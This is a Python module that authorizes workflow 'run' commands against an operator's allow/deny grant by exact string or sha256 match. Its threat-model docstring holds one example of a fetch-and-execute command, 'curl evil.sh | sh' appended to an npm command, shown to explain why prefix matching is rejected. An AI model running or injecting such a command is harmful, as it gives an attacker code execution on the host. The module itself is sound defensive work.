"""Permission matcher: authorize a workflow RequiredAction against a workspace grant.

Threat model (plan §3.2 "Permission matching (hard rule)", §5): the repo profile
(`.orchestrator/workflow.yaml`) is attacker-controlled in the sense that ANYONE with
commit rights to the product repo can edit it. If a repo-authored `run:` string could
ever be authorized by anything looser than byte-exact identity, a single malicious PR
would win arbitrary host code execution — the harness runs actions as the agent OS
user, `cwd`=worktree, with no sandbox beyond that. Concretely:

    npm ci --no-audit && curl evil.sh | sh

shares a prefix with a legitimate, operator-approved command
(`npm ci --no-audit --no-fund`). Prefix matching, glob matching, substring matching,
or any regex looser than a literal would let this string "match" the approved one and
run with full host access. So this module does exactly ONE thing when authorizing a
custom `run` string: byte-for-byte string equality (after a symmetric `.strip()`) or
an explicit `sha256:<hexdigest>` pin against the exact run string. Nothing else.
Builtins are different — they are engine-shipped, named, reviewed adapter code the
operator already trusts by installing this engine, so they are authorized by identity
(no shell string involved at all).

Authority itself lives OUTSIDE the repo profile. `Permissions` (allow/deny/bypass) is
built exclusively from the operator-owned workspace manifest (plan §2.1/§2.2) — this
module never reads the repo profile and has no notion of "layers"; by the time a
caller builds `Permissions` and calls `authorize()`, the repo's own `permissions:` key
(if it foolishly declared one) must already have been dropped by the loader (WP-06)
and recorded as a warning. `authorize()` cannot enforce that on its own — it can only
guarantee that whatever `Permissions` object it IS given is matched with no leniency.

`authorize()` is intentionally duck-typed on `action`: it reads only `.run` and
`.builtin` (both expected to default to `""` when unset), so it works against the
real `RequiredAction` dataclass (orchestrator/workflow/models.py) or any lookalike
stub without importing it — this module has zero package-internal imports.

Precedence, in order (deny is absolute — it beats bypass AND builtin identity, so an
operator can always kill-switch a specific dangerous command even after granting
`bypass: true` or even if it happens to be a builtin name):
    1. deny match  -> "deny"
    2. builtin set -> "allow"
    3. bypass      -> "allow"
    4. run string exact-matches an allow entry -> "allow"
    5. otherwise   -> "escalate"

No glob, no prefix, no regex, no substring matching anywhere in this module.
"""

from __future__ import annotations

import hashlib
from dataclasses import dataclass
from typing import Any

_SHA256_PREFIX = "sha256:"


@dataclass(frozen=True)
class Permissions:
    """The operator-granted authority for a workspace (workspace-manifest layer only).

    Entries in `allow`/`deny` are exact `run` strings (matched after a symmetric
    `.strip()` on both sides) or `sha256:<hexdigest>` pins (matched against the
    unmodified, unstripped UTF-8 bytes of the action's `run` string) or bare builtin
    names (matched against the action's `.builtin` identity, again after `.strip()`).
    """

    allow: tuple[str, ...] = ()
    """Exact `run` strings, `sha256:<hex>` pins, or builtin names the operator grants."""

    deny: tuple[str, ...] = ()
    """Same forms as `allow`. A deny match always wins, regardless of anything else."""

    bypass: bool = False
    """Operator "trust this repo's committers" escape hatch. Never settable by the
    repo profile itself — deny still overrides it, and it never overrides builtin
    denial either (deny is checked first, unconditionally)."""


def _sha256_hex(exact: str) -> str:
    """sha256 hexdigest of the exact UTF-8 bytes of a run string (no normalization)."""
    return hashlib.sha256(exact.encode("utf-8")).hexdigest()


def _entry_matches(entry: str, run: str, builtin: str) -> bool:
    """True iff a single allow/deny entry matches this action's run or builtin identity.

    Three forms, and only these three:
    - `sha256:<hex>` pin: matches iff `<hex>` equals the sha256 hexdigest of the
      action's *exact, unstripped* run-string bytes. A pin is a byte-exact promise —
      it deliberately does not tolerate whitespace differences.
    - Plain string entry vs. `run`: exact equality after a symmetric `.strip()` of
      both the entry and the run string. No other normalization (no case-folding, no
      Unicode canonicalization, no comment/whitespace stripping beyond the outer
      `.strip()`) — anything else would open a bypass seam.
    - Plain string entry vs. `builtin`: same symmetric-`.strip()` exact equality,
      so a deny list can name a builtin by identity too (deny beats builtin, per the
      precedence rule below).
    """
    if entry.startswith(_SHA256_PREFIX):
        digest = entry[len(_SHA256_PREFIX):].strip().lower()
        return bool(run) and _sha256_hex(run) == digest

    normalized_entry = entry.strip()
    if run and normalized_entry == run.strip():
        return True
    if builtin and normalized_entry == builtin.strip():
        return True
    return False


def _any_match(entries: tuple[str, ...], run: str, builtin: str) -> bool:
    return any(_entry_matches(entry, run, builtin) for entry in entries)


def authorize(action: Any, perms: Permissions) -> str:
    """Return "allow" | "deny" | "escalate" for `action` under `perms`.

    Reads only `action.run` and `action.builtin` (duck-typed — see module docstring).
    Precedence, exactly, in order:
      1. deny match  -> "deny"   (beats EVERYTHING, including bypass and builtin)
      2. builtin set -> "allow"  (engine-shipped adapter code, trusted by identity)
      3. bypass      -> "allow"  (operator-granted blanket trust)
      4. run string exact-matches an allow entry (or a matching sha256 pin) -> "allow"
      5. otherwise   -> "escalate"
    """
    run = getattr(action, "run", "") or ""
    builtin = getattr(action, "builtin", "") or ""

    if _any_match(perms.deny, run, builtin):
        return "deny"

    if builtin:
        return "allow"

    if perms.bypass:
        return "allow"

    if run and _any_match(perms.allow, run, builtin=""):
        return "allow"

    return "escalate"
